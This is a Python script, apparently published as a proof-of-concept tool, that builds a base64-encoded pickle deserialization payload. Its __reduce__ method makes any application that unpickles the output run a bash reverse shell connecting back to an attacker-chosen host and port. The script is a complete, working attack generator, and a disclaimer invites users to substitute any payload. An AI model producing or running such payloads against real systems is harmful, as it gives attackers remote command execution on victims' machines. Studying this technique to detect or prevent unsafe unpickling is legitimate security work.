# A Python-Pickle Deserialization payload generator
# Author: Anurag Mondal (7Ragnarok7)
# Mail: 7Ragnarok7@pm.me
# Github: https://github.com/7Ragnarok7/PoC/blob/main/Python/pickle-deserialization.py

# Note: By default the payload is set to create a reverse shell from the victim computer
# but you can replace it with any payload of your choice.
# Disclaimer: I shall not be held responsible for whatsover you do with this tool.


from pickle import dumps
from base64 import b64encode
from sys import argv

try: lhost, lport = argv[1:]
except: exit('Usage: python pickle-deserialization.py lhost lport')

payload = f'/bin/bash -c "/bin/bash -i &>/dev/tcp/{lhost}/{lport}<&1"'  #  <-- Place Your Payload here

class rce():
    def __reduce__(self):
        from os import system
        return (system,(payload,))
        
print(f'\nEncoded Payload: {b64encode(dumps(rce())).decode("utf-8")}\n')



